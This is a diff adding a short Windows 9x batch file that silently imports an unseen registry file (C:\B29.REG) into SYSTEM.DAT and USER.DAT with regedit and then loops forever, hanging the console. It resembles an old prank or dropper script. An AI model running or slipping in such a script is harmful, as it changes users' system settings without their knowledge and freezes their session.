@@ -1,0 +1,4 @@
+@echo off
+C:\WINDOWS\REGEDIT.EXE /L:C:\WINDOWS\SYSTEM.DAT /R:C:\WINDOWS\USER.DAT C:\B29.REG
+:loop
+goto loop
